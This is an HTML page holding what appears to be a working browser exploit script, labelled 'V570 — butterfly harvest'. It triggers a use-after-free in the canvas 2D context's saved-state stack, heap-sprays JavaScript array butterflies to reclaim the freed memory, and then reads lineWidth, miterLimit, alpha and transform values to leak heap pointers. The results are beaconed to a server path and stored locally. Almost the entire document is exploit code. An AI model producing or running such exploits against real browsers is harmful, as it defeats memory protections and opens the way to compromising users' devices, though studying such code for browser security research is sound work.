<!DOCTYPE html>
<html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>V570</title></head>
<body><pre id="out">V570 — butterfly harvest</pre>
<script>
'use strict';
var RID='v570'+Date.now().toString(36).slice(-6);
var O=document.getElementById('out');
function say(s){O.textContent+='\n'+s;}
function bk(tag,body){try{fetch('/beacon/V570-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now(),{method:'GET',cache:'no-store'}).catch(function(){});}catch(e){}}

var P=new URLSearchParams(location.search);
var NSAVES=+(P.get('saves')||'32');
var NFLY=+(P.get('fly')||'300');
var FLYSIZE=+(P.get('fs')||'0');

say('saves='+NSAVES+' fly='+NFLY+' flySize='+(FLYSIZE||'auto'));
bk('BOOT','saves='+NSAVES+',fly='+NFLY+',fs='+(FLYSIZE||'auto'));

/* ===== Helpers ===== */
var f64buf=new Float64Array(1);
var u32buf=new Uint32Array(f64buf.buffer);
function dblBits(d){f64buf[0]=d;return{lo:u32buf[0],hi:u32buf[1]};}
function hex8(v){return('00000000'+((v>>>0).toString(16))).slice(-8);}
function hexPair(hi,lo){return'0x'+hex8(hi)+hex8(lo);}

/* ===== Compute target sizes ===== */
/* After NSAVES save() calls + realizeSaves, m_size = NSAVES+1.
   Vector growth from inline cap=1:
   First grow to ~16, then potentially to ~32 or more.
   We target multiple possible buffer sizes for the butterfly spray. */
var mSize=NSAVES+1;
var possibleCaps=[16,21,24,32,42,48,64];
var targetBytes=[];
for(var ci=0;ci<possibleCaps.length;ci++){
  if(possibleCaps[ci]>=mSize){
    targetBytes.push(possibleCaps[ci]*240);
  }
}
say('mSize='+mSize+' targetBytes='+targetBytes.join(','));
bk('SIZES','mSize='+mSize+',targets='+targetBytes.join(','));

/* Compute flySize to match each target. Butterfly alloc = 8 + N*8 bytes.
   We want 8+N*8 >= targetBytes. So N = ceil((target-8)/8).
   But bmalloc rounds up to size class. We also try the exact class. */
var flySizes=[];
if(FLYSIZE>0){
  flySizes=[FLYSIZE];
}else{
  var seen={};
  for(var ti=0;ti<targetBytes.length;ti++){
    var tb=targetBytes[ti];
    /* bmalloc size classes near this range (approximate) */
    var classes=[3584,3840,4096,4608,5120,5632,6144,7168,7680,8192,9216,10240,11264,12288,15360,16384];
    for(var si=0;si<classes.length;si++){
      if(classes[si]>=tb&&classes[si]<=tb*2){
        var n=Math.floor((classes[si]-8)/8);
        if(!seen[n]){seen[n]=1;flySizes.push(n);}
      }
    }
  }
  if(flySizes.length===0)flySizes=[1023];
}
say('flySizes='+flySizes.join(','));
bk('FLYSZ',flySizes.join(','));

/* ===== P1: Pre-create object pool ===== */
say('P1: creating object pool...');
var objPool=[];
var maxFly=Math.max.apply(null,flySizes);
try{
  for(var i=0;i<NFLY*maxFly;i++){
    objPool.push({v:i});
  }
  say('P1: '+objPool.length+' objects pooled');
  bk('P1','pool='+objPool.length);
}catch(e){say('P1-ERR:'+e.message);bk('P1E',e.message);}

/* ===== P2: triggerUAF with inflated save stack ===== */
var innerCtx=null;
var saveCount=0;
function triggerUAF(){
  var c=document.createElement('canvas');
  c.width=1;c.height=1;
  var d={};
  Object.defineProperty(d,'alpha',{get:function(){
    var ctx=c.getContext('2d');
    innerCtx=ctx;
    for(var s=0;s<NSAVES;s++){
      ctx.save();
    }
    saveCount=NSAVES;
    ctx.lineWidth=1.0;
    return true;
  }});
  c.getContext('bitmaprenderer',d);
  return c;
}

var outerC;
try{
  outerC=triggerUAF();
  say('P2: UAF '+(innerCtx?'OK':'FAIL')+' saves='+saveCount);
  bk('P2','ctx='+(innerCtx?'OK':'FAIL')+',saves='+saveCount);
}catch(e){say('P2-ERR:'+e.message);bk('P2E',e.message);}

/* ===== P3: Butterfly spray — AFTER UAF to reclaim freed stateStack buffer ===== */
say('P3: butterfly spray ('+NFLY+' arrays per size, '+flySizes.length+' sizes)...');
var flyArrays=[];
var poolIdx=0;
try{
  for(var si=0;si<flySizes.length;si++){
    var sz=flySizes[si];
    var batch=[];
    var perSize=Math.floor(NFLY/flySizes.length);
    if(perSize<10)perSize=10;
    for(var i=0;i<perSize;i++){
      var a=new Array(sz);
      for(var j=0;j<sz;j++){
        a[j]=objPool[poolIdx%objPool.length];
        poolIdx++;
      }
      batch.push(a);
    }
    flyArrays.push({size:sz,arrays:batch});
    say('P3: sprayed '+perSize+' arrays of '+sz+' (alloc ~'+(8+sz*8)+' bytes)');
  }
  bk('P3','sizes='+flySizes.length+',total='+poolIdx);
}catch(e){say('P3-ERR:'+e.message);bk('P3E',e.message);}

/* ===== P4: JS-only smoke ===== */
try{
  var ts=innerCtx.toString();
  say('P4: toString='+ts);
  bk('P4',ts);
}catch(e){say('P4-ERR:'+e.message);bk('P4E',e.message);}

/* ===== P5: lineWidth harvest — the info leak ===== */
say('P5: lineWidth read...');
bk('P5','pre');

var leaked=[];
try{
  var lw=innerCtx.lineWidth;
  say('P5-LW: '+lw);
  var bits=dblBits(lw);
  say('P5-RAW: '+hexPair(bits.hi,bits.lo));
  bk('P5LW','lw='+lw+','+hex8(bits.hi)+hex8(bits.lo));

  if(bits.hi===0&&bits.lo===0){
    say('P5: zero — buffer not reclaimed or m_buffer/m_size zeroed by destructor');
    bk('P5Z','zero');
  }else if(lw===1.0){
    say('P5: default 1.0 — stateStack not overwritten (wrong size class?)');
    bk('P5DEF','1.0');
  }else{
    var topWord=bits.hi>>>16;
    if(topWord===0&&(bits.hi!==0||bits.lo!==0)){
      say('!!!! P5-PTR: '+hexPair(bits.hi,bits.lo)+' !!!!');
      bk('P5PTR',hexPair(bits.hi,bits.lo));
      leaked.push({field:'lineWidth',hi:bits.hi,lo:bits.lo,stateOff:48});
    }else if(topWord===0xFFFE){
      say('P5: JSValue int32: '+(bits.lo|0));
      bk('P5INT',''+(bits.lo|0));
    }else{
      say('P5: non-pointer value: '+hexPair(bits.hi,bits.lo)+' (double='+lw+')');
      bk('P5V',hex8(bits.hi)+hex8(bits.lo));
    }
  }
}catch(e){say('P5-ERR:'+e.message);bk('P5E',e.message);}

/* ===== P6: More State field reads ===== */
say('P6: additional fields...');
var extraFields=[
  ['miterLimit',64],
  ['globalAlpha',96],
  ['lineDashOffset',184]
];

for(var fi=0;fi<extraFields.length;fi++){
  var fname=extraFields[fi][0],foff=extraFields[fi][1];
  try{
    var val;
    if(fname==='miterLimit')val=innerCtx.miterLimit;
    else if(fname==='globalAlpha')val=innerCtx.globalAlpha;
    else if(fname==='lineDashOffset')val=innerCtx.lineDashOffset;
    else continue;
    var bits=dblBits(val);
    say('P6-'+fname+': '+val+' → '+hexPair(bits.hi,bits.lo));
    bk('P6'+fname.slice(0,4),hex8(bits.hi)+hex8(bits.lo));

    var topWord=bits.hi>>>16;
    if(topWord===0&&(bits.hi!==0||bits.lo!==0)){
      say('P6-PTR! '+fname+' → '+hexPair(bits.hi,bits.lo));
      leaked.push({field:fname,hi:bits.hi,lo:bits.lo,stateOff:foff});
    }
  }catch(e){say('P6-'+fname+'-ERR:'+e.message);bk('P6E'+fname.slice(0,2),e.message);}
}

/* ===== P7: Transform — 6 doubles at State+112..+160 ===== */
say('P7: transform...');
try{
  var xf=innerCtx.getTransform();
  var xfParts=[
    ['a',xf.a],['b',xf.b],['c',xf.c],
    ['d',xf.d],['e',xf.e],['f',xf.f]
  ];
  for(var xi=0;xi<xfParts.length;xi++){
    var bits=dblBits(xfParts[xi][1]);
    say('P7-xf.'+xfParts[xi][0]+': '+hexPair(bits.hi,bits.lo));
    var topWord=bits.hi>>>16;
    if(topWord===0&&(bits.hi!==0||bits.lo!==0)){
      say('P7-PTR! xf.'+xfParts[xi][0]+' → '+hexPair(bits.hi,bits.lo));
      leaked.push({field:'xf.'+xfParts[xi][0],hi:bits.hi,lo:bits.lo,stateOff:112+xi*8});
    }
  }
  bk('P7','done');
}catch(e){say('P7-ERR:'+e.message);bk('P7E',e.message);}

/* ===== P8: Summary ===== */
say('');
say('===== SUMMARY =====');
say('Total leaked pointers: '+leaked.length);
var summary='ptrs='+leaked.length;
for(var li=0;li<leaked.length;li++){
  var l=leaked[li];
  say('  ['+li+'] '+l.field+' (State+'+l.stateOff+') = '+hexPair(l.hi,l.lo));
  if(li<5)summary+=','+l.field+'='+hexPair(l.hi,l.lo);
}
bk('RESULT',summary);

if(leaked.length>0){
  say('');
  say('!!!! BUTTERFLY HARVEST SUCCESS !!!!');
  bk('WIN',hexPair(leaked[0].hi,leaked[0].lo));
  try{localStorage.setItem('v570_leak',JSON.stringify(leaked));}catch(e){}
}else{
  say('');
  say('No pointers. Debug info:');
  say('  Expected m_size='+mSize+', reading at m_buffer+'+(mSize-1)*240+' + fieldOffset');
  say('  lineWidth reads at m_buffer+'+(((mSize-1)*240)+48));
  say('  miterLimit reads at m_buffer+'+(((mSize-1)*240)+64));
  say('  Butterfly slot for lineWidth: index '+Math.floor((((mSize-1)*240)+48-8)/8));
  say('  Try: ?saves=16 or saves=64 or fly=500');
  bk('MISS','m_size='+mSize);
}

say('');
say('V570 complete.');
bk('DONE','ptrs='+leaked.length);
</script>
</body>
</html>
